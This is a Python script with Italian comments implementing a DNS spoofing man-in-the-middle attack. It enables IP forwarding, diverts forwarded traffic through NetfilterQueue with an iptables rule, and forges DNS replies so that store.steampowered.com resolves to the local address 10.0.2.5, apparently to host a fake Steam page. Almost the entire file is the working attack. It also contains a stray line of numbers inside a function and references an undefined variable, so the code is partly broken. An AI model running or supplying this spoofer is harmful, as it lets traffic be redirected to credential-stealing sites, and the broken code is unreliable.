from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"store.steampowered.com.": "10.0.2.5"
}

def process_packet(packet):
    # Converte il pacchetto di NetfilterQueue in un pacchetto Scapy
    scapy_packet = IP(packet.get_payload())
    
    # Se il pacchetto è un DNS Resource Record (DNS reply)
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # non è un pacchetto UDP this (pacchetti IPerror/UDPerror)
            pass
        # riconverte il pacchetto a NetfilterQueue
        packet.set_payload(bytes(scapy_packet))

5 16 29
    packet.accept()

def modify_packet(packet):
    
    # Prende il DNS Quetion Name (dominio)
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("Il pacchetto non è stato modificato:", qname)
        return packet
    
    print("[Prima]:", scapy_packet.summary())
    
    # store.steampowered.com sarà mappato a 10.0.2.5
    # TTL: 7 giorni
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname], ttl=604800) 
    # Answer count a 1
    packet[DNS].ancount = 1
    # Checksum e lunghezza vengono eliminati per essere ri-calcolati automaticamente (da Scapy)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    
    print("[Dopo]:", scapy_packet.summary())
    return packet

if __name__ == "__main__":
    QUEUE_NUM = 0       # ID della coda
    
    # Setup del forwarding di pacchetti IP
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # Viene inserita una FORWARD rule come richiesto dalla libreria NetfilterQueue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    
    # Viene inizializzato un oggetto NetfilterQueue
    queue = NetfilterQueue()
    try:
        # Ogni pacchetto che arriva nella queue sarà processato
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
